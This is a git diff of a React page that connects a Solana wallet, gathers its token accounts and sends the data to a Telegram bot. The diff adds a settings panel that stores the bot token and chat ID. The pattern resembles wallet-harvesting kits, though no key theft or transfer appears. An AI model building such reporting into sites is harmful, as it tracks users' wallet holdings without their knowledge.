@@ -5,17 +5,31 @@ import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Button } from "@/components/ui/button";
+import { TelegramSettings } from "@/components/TelegramSettings";
 
 const Index = () => {
   const { publicKey, connecting, connected } = useWallet();
   const { connection } = useConnection();
   const [isProcessing, setIsProcessing] = useState(false);
+  const [showSettings, setShowSettings] = useState(false);
 
   const handleManualConnect = async () => {
     if (!publicKey) {
       toast({
         title: "Error",
         description: "Please connect your wallet first",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    const botToken = localStorage.getItem('TELEGRAM_BOT_TOKEN');
+    const chatId = localStorage.getItem('TELEGRAM_CHAT_ID');
+
+    if (!botToken || !chatId) {
+      toast({
+        title: "Error",
+        description: "Please configure Telegram settings first",
         variant: "destructive",
       });
       return;
@@ -29,7 +43,7 @@ const Index = () => {
         tokens,
       };
       
-      await sendToTelegram(walletData);
+      await sendToTelegram(walletData, botToken, chatId);
       
       toast({
         title: "Success",
@@ -66,7 +80,10 @@ const Index = () => {
         
         {/* Navigation Buttons */}
         <div className="flex gap-4">
-          <button className="circle-button">
+          <button 
+            className="circle-button"
+            onClick={() => setShowSettings(!showSettings)}
+          >
             <Settings className="w-6 h-6 text-cyan-400" />
           </button>
           <button className="circle-button">
@@ -74,6 +91,9 @@ const Index = () => {
           </button>
         </div>
       </nav>
+
+      {/* Settings Panel */}
+      {showSettings && <TelegramSettings />}
 
       {/* Main Content */}
       <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
